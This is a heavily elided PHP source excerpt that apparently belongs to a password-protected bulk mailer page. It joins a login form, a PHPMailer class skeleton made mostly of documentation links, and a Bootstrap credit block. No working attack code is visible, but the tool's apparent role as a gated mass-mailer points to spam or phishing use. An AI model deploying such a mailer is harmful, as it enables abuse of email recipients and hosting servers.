...
</font><font>fb.com/ico.phtml</font><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form></pre>";
        exit;        
    }
}
...
class PHPMailer
{
     ...
     * @link sprain.ch/blog/downloads/php-class-easypeasyics-create-ical-files-with-php/
     * @link kigkonsult.se/iCalcreator/
     * @var string
     */
    public $Ical = '';
     ...
     * @link www.postfix.org/VERP_README.html Postfix VERP info
     * @var boolean
     */
     ...
     * @return array
     * @link www.andrew.cmu.edu/user/agreen1/testing/mrbs/web/Mail/RFC822.php A more careful implementation
     */
    ...
    public static function validateAddress($address, $patternselect = 'auto')
    {
        ...
        switch ($patternselect) {
            case 'pcre8':
                 ...
                 * @link squiloople.com/2009/12/20/email-address-validation/
            ...
            case 'html5':
                 ...
                 * @link www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)
                 */
                return (boolean)preg_match(
     ...
     * @param string $header The message headers
     * @param string $body The message body
     * @link www.php.net/manual/en/book.mail.php
     * @throws phpmailerException
     * @access protected
     * @return boolean
     */
     ...
     * @link www.php.net/manual/en/function.mb-encode-mimeheader.php#60283
     * @access public
     * @param string $str multi-byte text to wrap encode
     ...
     * @return string
     * @link www.php.net/manual/en/function.quoted-printable-decode.php#89417 Adapted from this comment
     */
     ...
     * @link tools.ietf.org/html/rfc2047
     * @param string $str the text to encode
     ...
     * @link www.php.net/manual/en/function.pathinfo.php#107461
...
print '<div class="container col-lg-6">
    ...
    <div class="col-lg-6"><br>
        ...
        <div id="well" class="well well">
            ...
            <h6>by <b><a href="'.$leaf['website'].'">'.$leaf['website'].'</a></b></h6>
        </div>
    </div>';    
